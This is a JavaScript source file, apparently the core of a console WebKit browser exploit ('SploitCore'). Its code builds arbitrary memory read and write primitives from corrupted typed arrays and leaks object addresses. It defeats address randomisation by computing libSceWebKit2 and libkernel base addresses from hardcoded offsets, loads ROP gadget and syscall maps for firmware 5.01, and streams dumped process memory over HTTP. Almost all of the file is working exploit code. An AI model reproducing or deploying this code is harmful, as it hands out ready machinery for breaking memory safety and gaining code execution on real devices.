/**
 Represents an instance of SploitCore
 @constructor
 @param {object} exploitMe - Reference to object used for leaking data
 */
var SploitCore = function SploitCore(exploitMe) {
    this.gc();

    this.va = exploitMe.va;
    this.vb = exploitMe.vb;
    this.leakee = exploitMe.leakee;
    this.leakaddr = exploitMe.leakaddr;

    this.allocated = {};

    // this.func = document.getElementById;
    this.func = parseFloat;
    this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9

    this.moduleBaseAddresses = [];

    this.sc = this;
    window.ECore = this;

    this.base = this.getBase();
    this.loadGadgets();


    debug_log(`leakFunc at: ${paddr(this.moduleBaseAddresses['leakFunc'])}`);
    debug_log(`${this.func.name || 'parseFloat'} at: ${paddr(this.moduleBaseAddresses['funcPointer'])}`);
    debug_log(`libSceWebKit2 at: ${paddr(this.base)}`);
    debug_log(`libkernel at: ${paddr(this.moduleBaseAddresses['libkernel'])}`);


    this.funcArgs = [];
    this.funcBuffer = new Uint32Array(0x1000);
    this.argsPointer = this.getArrayBufferAddr(this.funcBuffer);

    for (var i = 0; i < 0x7FFF; i++) { this.funcArgs[i] = 0x41410000 | i; }

    this.funcBuffer[0] = 0x13371337;

    if (this.read4(this.argsPointer) != 0x13371337) {
        throw new Error("Stack frame is not aligned!");
    }

    debug_alert('~~~~~~~~~~Success~~~~~~~~~~');
};


SploitCore.prototype.loadGadgets = function loadGadgets(version) {
    window.syscalls = window.syscallMap[version || '5.01'];

    generateBasicImportMap();
    window.basicImports = window.basicImportMap[version || '5.01'];

    generateGadgetMap();
    window.gadgets = window.gadgetMap[version || '5.01'];
};

/**
	Returns address of function
	@returns {u64} Address of function 
 */
SploitCore.prototype.getFuncAddr = function getFuncAddr(offset) {
    this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9

    var tlfuncaddr = this.getAddr(this.func);
    
    return this.read8(tlfuncaddr, offset || 6);
};

SploitCore.prototype.leakFunction = function leakFunction(smashFunction, offset) {
    var tlfuncaddr = this.getAddr(smashFunction);

    return this.read8(tlfuncaddr, offset || 6);
};


/**
	Reads 4 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read4 = function read4(addr, offset) {
    if (arguments.length === 1) {
        offset = 0;
    }

    if (this.origVa === undefined) {
        this.origVa = [this.va[4], this.va[5], this.va[6]]
    }

    assertu64(addr);

    this.va[4] = addr[0];
    this.va[5] = addr[1];
    this.va[6] = 1 + offset;

    var val = this.vb[offset];

    this.va[4] = this.origVa[0];
    this.va[5] = this.origVa[1];
    this.va[6] = this.origVa[2];

    return val;
};

/**
	Writes 4 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write4 = function write4(val, addr, offset) {
    if (arguments.length === 2) {
        offset = 0;
    }

    if (this.origVa === undefined) {
        this.origVa = [this.va[4], this.va[5], this.va[6]]
    }

    this.va[4] = addr[0];
    this.va[5] = addr[1];
    this.va[6] = 1 + offset;

    this.vb[offset] = val;

    this.va[4] = this.origVa[0];
    this.va[5] = this.origVa[1];
    this.va[6] = this.origVa[2];
};

/**
	Reads 8 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read8 = function read8(addr, offset) {
    if (arguments.length === 1) {
        offset = 0;
    }
    return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};

/**
	Writes 8 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write8 = function write8(val, addr, offset) {
    if (arguments.length === 2) {
        offset = 0;
    }
    val = pad64(val);
    this.write4(val[0], addr, offset);
    this.write4(val[1], addr, offset + 1);
};


/**
	Calls callback with an ArrayBuffer pointing to the view of memory requested.<br>
	If you return a value from within the callback it will be returned by {@link SploitCore#memview}<br>
	<b>Warning:</b> If you keep that view or any object using it around; you will tank the GC and your Switch will crash.
	@param {u64} addr - Base address for view
	@param {number} size - Number of bytes to view
	@param {function} func - Function which is called with ArrayBuffer.
	@returns {any} Value returned by func
 */
SploitCore.prototype.memview = function memview(addr, size, func) {
    var ab = new ArrayBuffer(0);
    var taddr = this.read8(this.getAddr(ab), 4);

    var origPtr = this.read8(taddr, 6);
    var origSize = this.read4(taddr, 8);
    this.write8(addr, taddr, 6);
    this.write4(size, taddr, 8);

    var ret = func.apply(this, [ab]);

    this.write8(origPtr, taddr, 6);
    this.write4(origSize, taddr, 8);

    return ret;
};

/**
	Returns address of object
	@param {object} obj - Object to get address of
	@returns {u64} Address of object
 */
SploitCore.prototype.getAddr = function getAddr(obj) {
    this.leakee['b'] = { 'a': obj };
    return this.read8(this.read8(this.leakaddr, 4), 4);
};

SploitCore.prototype.getArrayBufferAddr = function(ab) {
    var offset = 0;
    if (ArrayBuffer.isView(ab)) {
        offset = ab.byteOffset;
        ab = ab.buffer;
    }
    if (!(ab instanceof ArrayBuffer)) {
        throw new Error('expected ArrayBuffer or view');
    }
    return add2(this.read8(this.read8(this.getAddr(ab), 4), 6), offset);
};

/**
	Returns base address
	@private
	@returns {u64}
 */
SploitCore.prototype.getBase = function() {
    var leakFunc = this.getFuncAddr();
    var funcPointer = this.read8(leakFunc, 16);

    var webkitBase = add2(funcPointer, 0); // copy
    webkitBase[0] &= ~0xFFF;
    webkitBase = sub2(webkitBase, 0x578000);

    var libkernel = this.read8(add2(webkitBase, 0x384BA40)); // pointer to pointer to stack_chk_fail -> look at epilogs to find this
    libkernel[0] &= ~0xFFF;
    libkernel = sub2(libkernel, 0x11000);


    this.moduleBaseAddresses['leakFunc'] = leakFunc;
    this.moduleBaseAddresses['funcPointer'] = funcPointer;
    this.moduleBaseAddresses['libSceWebKit2'] = webkitBase;
    this.moduleBaseAddresses['libkernel'] = libkernel;

    return webkitBase;
};

/**
	Allocates a region of memory to use
	@param {number} bytes - Size of region
	@returns {u64} Address of region
 */
SploitCore.prototype.malloc = function(bytes) {
    var obj = new ArrayBuffer(bytes);
    var addr = this.getArrayBufferAddr(obj);
    this.allocated[addr] = obj;
    return addr;
};

SploitCore.prototype.free = function(addr) {
    delete this.allocated[addr];
};

/**
	Initiate a memory dump over HTTP
	@param {u64} address - Memory address to start from 
	@param {number} size - Number of bytes you wish to dump
    @param {string} fileName - Name of file, used to set Content-Disposition
 */
SploitCore.prototype.memDump = function memDump(address, size, fileName, writeContinue) {
    if (ArrayBuffer.isView(address) || address instanceof ArrayBuffer) {
        address = this.getArrayBufferAddr(address);
    }
    var totalSize = trunc32(size);
    var idx = 0;

    debug_log('Dumping memory!');
    for (var idx = 0; idx < totalSize; idx += 0x800000) {
        size = totalSize - idx;
        size = size > 0x800000 ? 0x800000 : size;

        this.memview(add2(address, idx), size, function(ab) {
            var view = new Uint8Array(ab);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'dump.jss', false);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('Content-Disposition', fileName || "dump.bin");
            if (writeContinue !== false) xhr.setRequestHeader('Write-Continue', "true");
            xhr.send(view);
        });
    }
    debug_log('Dumped memory succesfully!');
};

/**
	Forces the garbage collector to run
 */
SploitCore.prototype.gc = function() {
    debug_log('Beginning GC force');

    function sub(depth) {
        // debug_log('GC force ' + depth);
        if (depth > 0) {
            var arr = [];
            // debug_log('Building...');
            for (var i = 0; i < 10; ++i) {
                // arr.push(new Uint8Array(0x40000));
                arr.push(new Uint8Array(0x10000));
            }
            // debug_log('Shifting...');
            while (arr.length > 0) {
                arr.shift();
            }
            sub(depth - 1);
        }
    }
    sub(10);
    debug_log('GC should be solid');
};

/**
	Reads a string from memory
	@param {u64} addr - Address to start from
	@param {number} length - Number of bytes to read
	@returns {string}
 */
SploitCore.prototype.readString = function(addr, length) {
    if (arguments.length === 1) {
        length = -1;
    }

    return this.memview(addr, 0xFFFFFFFF, function(view) {
        var u8b = new Uint8Array(view);
        var out = '';

        for (var i = 0; length === -1 && u8b[i] !== 0 || length !== -1 && i < length; i++) {
            out += String.fromCharCode(u8b[i]);
        }

        return out;
    });
};

